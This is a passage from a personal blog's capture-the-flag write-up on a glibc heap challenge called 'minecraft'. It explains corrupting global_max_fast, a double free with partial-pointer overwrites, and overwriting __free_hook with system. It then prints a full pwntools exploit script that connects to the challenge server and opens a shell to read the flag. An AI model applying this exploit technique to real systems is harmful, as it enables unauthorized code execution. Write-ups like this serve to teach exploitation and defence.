store the head of the doubly-linked list of each fastbin size. Thus, it becomes obvious that when global_max_fast becomes too big, the entry for that large size will be out of bounds. <red>This will give us the ability to write heap address to outside of the fastbinY array</red></li><li>There is also this piece of code in the glibc _int_malloc function:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> ((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) (nb) <span style=color:#f92672>&lt;=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) (<span style=color:#a6e22e>get_max_fast</span> ()))
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      idx <span style=color:#f92672>=</span> <span style=color:#a6e22e>fastbin_index</span> (nb);
+</span></span><span style=display:flex><span>      mfastbinptr <span style=color:#f92672>*</span>fb <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>fastbin</span> (av, idx);
+</span></span><span style=display:flex><span>      mchunkptr pp;
+</span></span><span style=display:flex><span>      victim <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>fb;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (victim <span style=color:#f92672>!=</span> NULL)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>	  <span style=color:#66d9ef>if</span> (SINGLE_THREAD_P)
+</span></span><span style=display:flex><span>	    <span style=color:#f92672>*</span>fb <span style=color:#f92672>=</span> victim<span style=color:#f92672>-&gt;</span>fd;
+</span></span></code></pre></div><p>fb is the pointer to the array entry (which with large size will be out of bounds). We can see that when we malloc, the array entry will get placed with the free fastbin fd pointer.<br>This is typical doubly-linked list remove functionality.<br>=> <red>If we can overwrite the fd pointer in the freed chunk, we can control what address gets written into that array entry</red><br>=> <red>A somewhat write-what-where primitive</red> (which get limited to the range after fastbinY array only)</p><h3 id=lfyg-the-pushback-lfyg><lf><yg>The pushback</lf></yg></h3><p>Immediately, we can recognize that __free_hook is in the range after fastbinY array.</p><ul><li>So we can just free a chunk with an appropriate size, to put heap address into __free_hook.</li><li>And then somehow overwrite the fd pointer to system_plt (no PIE).</li><li>Malloc again and <strong>free_hook gets replaced with system_plt<br>_</strong>__________________________________________________________________________</li></ul><p>Sadly we dont have a UAF anymore, thats the restriction of this challenge. However we still have double-free vulnerability on our hands, the plan should look like this:</p><ul><li>Free chunk1 to put heap address into __free_hook.</li><li>Free chunk2 (to avoid double free detection)</li><li>Free chunk1 again (now there are 2 chunk1 on the freebin list)</li><li>Malloc to take chunk1 out, overwrite the fd pointer.</li><li>Malloc to take chunk2 out.</li><li>Malloc to take chunk1 out again, however this time the fd pointer has been overwritten, and we have our controlled write.<br>_____________________________________________________________________________</li></ul><p>Unfortunately this would fail, due to the fact that after step1, __free_hook will be heap address, so the second time we free, __free_hook gets called and we get segfault :(</p><h3 id=lfyg-the-116-chance-to-succeed-was-too-good-to-be-true-lfyg><lf><yg>The 1/16 chance to succeed was too good to be true</lf></yg></h3><p>We have now realized we cannot just free a chunk to write into __free_hook right again. So what can we do?<br>We have to find a different way to overwrite the fd pointer. What if we can achieve something like this:</p><ul><li>Free chunk1 with appropriate size, heap address gets written into __free_hook (wont use free again)</li><li>Malloc chunk2, somehow chunk2 will overwrite into chunk1 fd pointer.</li><li>Malloc to take chunk1 out, and <strong>free_hook gets written with the address of our control.<br>=> We have to figure out how to do this: <code>Malloc chunk2, somehow chunk2 will overwrite into chunk1 fd pointer.</code><br>Well a double-free vulnerability is already pretty powerful, we can just overwrite fd pointer to point to different things (perform a fastbin attack)<br>=> <red>We can point it to a fake chunk near the freed chunk1, so the next malloc we can overwrite into chunk1 data</red><br>_</strong>__________________________________________________________________________________</li></ul><p>Again unfortunately no leak, so we dont know where to point to. However remember what i said earlier:</p><p><em>&ldquo;We can now just perform a fastbin attack near __malloc_hook, but sadly we do not have a leak, and at the same time, we don&rsquo;t have any libc address left on the heap to do partial overwrite.&rdquo;</em></p><p>But we have heap address already on the heap, specifically the fd pointer, is pointing to next chunk in the heap segment, <red>thus we can partial overwrite to point to a different chunk in the heap segment.</red><br>Again this partial overwrite will have 4 bit randomization (we have to partial overwrite 2 bytes, the first 12 bits are not affected by aslr)</p><p>And our chance to succeed decrease even more. C&rsquo;est la vie :(</p><h3 id=lfyg-the-full-exploit-plan-lfyg><lf><yg>The full exploit plan</lf></yg></h3><p>The heap layout i want to achieve:<br><img src=/images/minecraft/heap_layout.png alt=layout></p><p><red>The exploit:</red></p><ul><li>Free chunk 2, then use UAF to partial overwrite the bk ptr to point to global_max_fast, so global_max_fast has a large value (1/16 chance)</li><li>Double free chunk 2, leverage this to again partial overwrite the fd ptr to point to another heap chunk instead, in particular our fake chunk (1/16 chance)</li><li>Free chunk 3, so __free_hook now have heap address, we will not free again to avoid segfault</li><li>Now when we malloc 0x510, we will get a chunk near chunk 3, thus we can overwrite the fd ptr in chunk 3 (overwrite to system plt)</li><li>After that malloc 0x3950, and __free_hook wil be written with our newly put fd ptr</li><li>Free chunk 4, spawn a shell
+-> 1/256 chance to succeed</li></ul><p><red>Exploit script:</red></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>place</span>(idx,sz,content):
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;(l)eak the end poem</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;p&#39;</span>)
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;idx: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(idx)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;len: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(sz)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;block: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,content)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>brk</span>(idx,option):
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;(l)eak the end poem</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span>)
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;idx: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(idx)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;inventory? </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,option)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>replace</span>(idx,content):
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;(l)eak the end poem</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;r&#39;</span>)
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;idx: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(idx)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;block: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,content)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>		r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;minecraft.chal.imaginaryctf.org&#34;</span>, <span style=color:#ae81ff>1337</span>)
+</span></span><span style=display:flex><span>		<span style=color:#75715e>#r = process(&#34;./vuln_patched&#34;)</span>
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x500</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x500</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x488</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x511</span>))
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0x3940</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>0x500</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>5</span>,<span style=color:#ae81ff>0x500</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)
+</span></span><span style=display:flex><span>		brk(<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;y&#39;</span>)
+</span></span><span style=display:flex><span>		
+</span></span><span style=display:flex><span>		replace(<span style=color:#ae81ff>1</span>, p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p16(<span style=color:#ae81ff>0xf940</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0x500</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>		brk(<span style=color:#ae81ff>6</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;n&#39;</span>)
+</span></span><span style=display:flex><span>		brk(<span style=color:#ae81ff>3</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;n&#39;</span>)
+</span></span><span style=display:flex><span>		brk(<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;n&#39;</span>)
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0x500</span>,p16(<span style=color:#ae81ff>0x5bf0</span>))
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>0x500</span>,p64(<span style=color:#ae81ff>0</span>))
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>6</span>,<span style=color:#ae81ff>0x500</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span>)
+</span></span><span style=display:flex><span>		brk(<span style=color:#ae81ff>2</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;n&#39;</span>)
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>7</span>,<span style=color:#ae81ff>0x500</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>14</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x3951</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x401114</span>))
+</span></span><span style=display:flex><span>		place(<span style=color:#ae81ff>8</span>,<span style=color:#ae81ff>0x3940</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span>)
+</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;(l)eak the end poem</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span>)
+</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;idx: </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;5&#39;</span>)
+</span></span><span style=display:flex><span>		sleep(<span style=color:#ae81ff>0.2</span>)
+</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;echo pwn&#34;</span>)
+</span></span><span style=display:flex><span>		sleep(<span style=color:#ae81ff>0.2</span>)
+</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;cat fl*&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>while</span> r<span style=color:#f92672>.</span>can_recv(timeout <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>):
+</span></span><span style=display:flex><span>			data <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>clean_and_log()
+</span></span><span style=display:flex><span>			log<span style=color:#f92672>.</span>info(data)
+</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>interactive()
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>		print(e)
+</span></span><span style=display:flex><span>		print(<span style=color:#e6db74>&#34;FAIL&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>pass</span>
+</span></span></code></pre></div><h3 id=lfyg-conclusion-lfyg-1><lf><yg>Conclusion</lf></yg></h3><p>My solution was just plain heap feng shui. The intended solution however will introduce a much more interesting heap exploitation technique, which might be the better way to exploit heap after GLIBC 2.35 (after __free_hook and __malloc_hook got removed)<br>I will write more about this technique in another post. <code>Because there is actually a minecraft revenge challenge ;)</code></p></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><img class=about__logo src=https://piers-n.github.io/images/cat.png alt=Logo><h1 class=about__title>piers</h1><p class=about__description>My personal blog on the journey of learning how2pwn</p></div><ul class=aside__social-links><li><a href=https://github.com/piers-n rel=me aria-label=GitHub title=GitHub><i class="fab fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=sendhelp2703@gmail.com rel=me aria-label=Email title=Email><i class="fas fa-envelope" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Writeup on 2 interesting heap challenges: Minecraft and Zookeeper</p><p>By Piers,
+24-07-2022</p></div></section><footer class=page__footer><p class=copyright>© 2022</p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p></footer></div></body></html>
